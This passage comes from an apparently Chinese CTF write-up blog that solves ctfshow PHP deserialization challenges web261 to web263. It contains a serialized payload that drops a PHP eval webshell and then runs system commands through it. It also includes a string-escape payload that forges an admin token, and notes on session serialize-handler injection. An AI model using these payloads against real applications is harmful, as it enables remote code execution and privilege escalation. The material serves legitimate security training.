language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><strong>å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize() å’Œ __wakeup() ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ</strong><br><strong>åˆ™åªæœ‰ __unserialize() æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚</strong><br>å…¶ä¸­æ³¨æ„ä¸€ä¸‹å‡ ä¸ªï¼š</p><ul><li><code>__wakeup()</code> ååºåˆ—åŒ–ä¹‹åç«‹åˆ»è°ƒç”¨</li><li><code>__invoke()</code> å½“ä½œæ–¹æ³•è°ƒç”¨å¯¹è±¡</li><li><code>__sleep()</code> ååºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</li></ul><p>invokeä¼¼ä¹è¿›ä¸å»ï¼Œè¿™é‡Œåˆ©ç”¨å¼±æ¯”è¾ƒæ‹¼æ¥ã€‚0x36då¯¹åº”çš„åè¿›åˆ¶æ˜¯877.<br>ç”±äºå¼±æ¯”è¾ƒçš„åŸå› usernameä¼ å…¥877.php å†åœ¨passwordä¸­åŠ å…¥shellå³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>());</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>877.php</code>ç„¶åä¼ å…¥shellï¼š<br><code>/877.php?1=system(&#39;cat /flag_is_here&#39;);</code></p><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><h3 id="ç»å…¸å­—ç¬¦ä¸²é€ƒé€¸-å¢é•¿ç‰ˆ"><a href="#ç»å…¸å­—ç¬¦ä¸²é€ƒé€¸-å¢é•¿ç‰ˆ" class="headerlink" title="ç»å…¸å­—ç¬¦ä¸²é€ƒé€¸-å¢é•¿ç‰ˆ"></a>ç»å…¸å­—ç¬¦ä¸²é€ƒé€¸-å¢é•¿ç‰ˆ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæç¤ºäº†è¿˜æœ‰ä¸€ä¸ªmessage.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£å°±æ˜¯è¦å°†userè½¬æ¢ä¸ºadminã€‚é‚£ä¹ˆå…ˆæŸ¥çœ‹æ ‡å‡†çš„ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥åœ¨tæœ«å°¾ä¿®æ”¹ï¼š<br>å°†tä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªè½¬æ¢å°±èƒ½å¤šå®¹çº³ä¸€ä¸ªä½ç½®ï¼Œé‚£ä¹ˆ26ä¸ªå­—ç¬¦éœ€è¦æ·»åŠ 27ä¸ªfuckã€‚<br>ç„¶åå°±ä½¿ç”¨payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span></span><br><span class="line">&amp;m=<span class="number">1</span></span><br><span class="line">&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®message.phpå³å¯è·å–åˆ°flag</p><h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request_id%22:%22160775411819724848183660%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=160775411819724848183660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&utm_term=session&spm=1018.2118.3001.4450">https://blog.csdn.net/solitudi/article/details/107750063?ops_request_misc=%7B%22request%5Fid%22%3A%22160775411819724848183660%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=160775411819724848183660&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_v2~rank_v29-2-107750063.pc_v2_rank_blog_default&amp;utm_term=session&amp;spm=1018.2118.3001.4450</a> session<br><a href="https://www.jb51.net/article/116246.htm">https://www.jb51.net/article/116246.htm</a> session</p></blockquote><h3 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h3><p><a href="http://www.zipæ–‡ä»¶æ³„éœ²/">www.zipæ–‡ä»¶æ³„éœ²</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::<span class="variable constant_">ATTR_CASE</span> =&gt; PDO::<span class="variable constant_">CASE_NATURAL</span></span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sqlæ³¨å…¥æ£€æŸ¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ç”Ÿæˆå”¯ä¸€æ ‡å¿—</span></span><br><span class="line"><span class="comment">*æ ‡å‡†çš„UUIDæ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>inc.phpä¸­æœ‰file_put_contentså‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));<span class="comment">// </span></span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //å¯†ç å¿…é¡»ä¸º<span class="number">128</span>ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ç™»é™†å¤±è´¥&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>index.phpå°±æ˜¯ç™»å½•é¡µé¢ã€check.phpè¿›è¡Œæ¬¡æ•°æ£€æµ‹ã€‚whatwebæ£€æµ‹ä¸€ä¸‹phpç‰ˆæœ¬æ˜¯7.3.11<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690621414307-0b75bbfc-20e6-46df-9214-207db020284a.png" alt="image.png"><br>session.serialize_handler( 5.5.4å‰é»˜è®¤æ˜¯phpï¼›5.5.4åæ”¹ä¸ºphp_serialize)å­˜åœ¨ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼</li><li>php é”®å+ç«–çº¿ï¼ˆ|ï¼‰+ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼</li><li>php_serialize ç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œä¼šå°†é”®åå’Œå€¼å½“ä½œä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–</li></ul><p>phpå¤„ç†å™¨è€Œä¸æ˜¯php_serializeå¤„ç†å™¨ï¼Œæ‰€ä»¥å­˜åœ¨sessionååºåˆ—æ¼æ´.<br>åœ¨ php_serialize å¼•æ“ä¸‹ï¼Œsessionæ–‡ä»¶ä¸­å­˜å‚¨çš„æ•°æ®ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span 